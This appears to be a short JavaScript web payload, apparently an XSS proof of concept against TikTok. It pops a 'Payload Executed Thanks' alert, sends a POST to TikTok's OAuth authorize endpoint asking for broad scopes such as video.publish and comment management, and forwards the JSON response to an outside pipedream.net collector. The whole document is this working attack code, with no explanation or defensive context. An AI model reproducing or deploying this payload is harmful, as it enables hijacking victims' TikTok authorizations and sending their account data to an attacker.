alert("Payload Executed Thanks"),
fetch("https://www.tiktok.com/passport/open/web/auth/v2/?client_key=7236493407642714114&scope=user.info.basic%2Cuser.info.username%2Cuser.account.type%2Cuser.insights%2Cvideo.insights%2Ccomment.list%2Cuser.info.stats%2Cvideo.list%2Ccomment.list.manage%2Cvideo.publish&aid=1459&state=%7B%22%22%3D%22undefined%22%7D&redirect_uri=https%3A%2F%2Ftiktok.com%2F&source=web&response_type=code", {
  method: "POST",
  headers: {
    "Content-Type": "application/json",
  },
  body: JSON.stringify({
  }),
})
  .then(response => response.json())
  .then(data => {
    fetch("https://eo6rrsm1iovif1t.m.pipedream.net/?data=", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(data),
    });
  })
  .catch(error => console.error('Error:', error));
